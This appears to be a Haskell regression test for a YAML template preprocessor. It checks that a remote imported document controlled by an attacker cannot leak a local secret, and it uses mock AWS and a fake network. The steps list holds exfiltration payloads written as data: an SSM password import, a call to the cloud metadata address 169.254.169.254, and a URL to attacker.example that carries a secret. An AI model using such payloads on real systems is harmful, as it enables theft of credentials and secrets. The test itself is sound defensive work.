{- | Regression test for the C4 review's exfiltration scenario (card C15):
a local template holds a secret in @$defs@ and imports a remote document
an attacker controls. Each row gives that document one step of the
attack; the last row combines them. Every step must be blocked: the
document gets an error, no AWS call is made, nothing connects to a
blocked address, and no request carries the secret or a value read from
SSM.

The remote document is served by a stub at its @https:@ location (as the
HTTP loader would); every location it requests goes through the real
dispatcher with a mock AWS environment and the fake network of
"Test.FakeHttp", so the run makes no AWS call and opens no socket. Its
attacker URLs use plain @http:@ so the fake network serves them.
-}
module Test.ExfiltrationTest (exfiltrationTests) where

import Data.ByteString qualified as BS
import Data.IORef (readIORef)
import Data.Text (Text)
import Data.Text qualified as T
import Data.Text.Encoding qualified as TE
import Test.Tasty (TestTree)
import Test.Tasty.HUnit (assertBool, assertFailure, testCase, (@?=))

import Iidy.Yaml.Engine (PreprocessResult (..))
import Iidy.Yaml.Imports.Loaders.Dispatch (ImportConfig (..), mkFullDispatcher, mkImportConfig)
import Iidy.Yaml.Imports.Loaders.HttpGuard (isBlockedAddress)
import Iidy.Yaml.Imports.Types (RemoteImports (..), importPolicy)
import Iidy.Yaml.OValue (toValue)
import Test.FakeHttp (FakeNet (..), FakeNetwork (..), Reply (..), fakeSeam, newFakeNet, v4)
import Test.ImportFixtures (preprocessText, stubDocsLoader)
import Test.MockAws (MockAws (..), newMockAws)

exfiltrationTests :: [TestTree]
exfiltrationTests =
    [ testCase name (assertBlocked imports body)
    | (name, imports, body) <- steps <> [("all steps in one document", concatMap snd3 steps, concatMap thd3 steps)]
    ]
  where
    snd3 :: (a, [b], c) -> [b]
    snd3 (_, b, _) = b
    thd3 :: (a, b, [c]) -> [c]
    thd3 (_, _, c) = c

-- | The secret the local template holds, and the value the mock SSM returns.
secret, ssmValue :: Text
secret = "s3cr3t"
ssmValue = "db.internal.example"

remoteDoc :: Text
remoteDoc = "https://evil.example/t.yaml"

-- | (step, the remote document's @$imports@ entries, its other body lines)
steps :: [(String, [(Text, Text)], [Text])]
steps =
    [ ("read the parent's secret as a variable", [], ["leak: \"{{secret}}\""])
    , ("import ssm: with the user's credentials", [("pw", "ssm:/prod/db/password")], [])
    , ("send the parent's secret to a loopback service", [("lo", "http://127.0.0.1:9/{{secret}}")], [])
    , ("read the instance metadata service", [("md", "http://169.254.169.254/latest/meta-data/")], [])
    ,
        ( "send an ssm: value to an attacker URL"
        , [("s", "ssm:/prod/db/password"), ("x", "http://attacker.example/{{s}}")]
        , []
        )
    ]

-- | The fake network: every request succeeds if it gets through.
network :: FakeNetwork
network =
    FakeNetwork
        { fwHosts = [("attacker.example", [[v4 (203, 0, 113, 66)]])]
        , fwReplies =
            [ (("127.0.0.1", "*"), Ok "ok: 1\n")
            , (("169.254.169.254", "*"), Ok "AccessKeyId: AKIA\n")
            , (("attacker.example", "*"), Ok "ok: 1\n")
            ]
        }

assertBlocked :: [(Text, Text)] -> [Text] -> IO ()
assertBlocked imports body = do
    mock <- newMockAws
    net <- newFakeNet
    let policy = importPolicy AllowRemoteImports
        cfg = (mkImportConfig (Just (mockEnv mock)) policy){icHttpSeam = fakeSeam network net}
        remoteSource =
            T.unlines $
                ["$defs:", "  own: x"]
                    <> (if null imports then [] else "$imports:" : ["  " <> k <> ": \"" <> v <> "\"" | (k, v) <- imports])
                    <> body
        root = "$defs:\n  secret: " <> secret <> "\n$imports:\n  t: \"" <> remoteDoc <> "\"\nout: ok\n"
    result <- preprocessText policy (stubDocsLoader [(remoteDoc, remoteSource)] (mkFullDispatcher cfg)) "local.yaml" root
    case result of
        Left _blocked -> pure ()
        Right r -> assertFailure ("the step was not blocked: " <> show (toValue (prValue r)))
    readIORef (mockRequests mock) >>= (@?= [])
    connected <- readIORef (fnConnected net)
    assertBool ("connected to a blocked address: " <> show connected) (not (any isBlockedAddress connected))
    requests <- readIORef (fnRequests net)
    assertBool
        ("a request carried the secret or an SSM value: " <> show requests)
        (not (any (\req -> any ((`BS.isInfixOf` req) . TE.encodeUtf8) [secret, ssmValue]) requests))
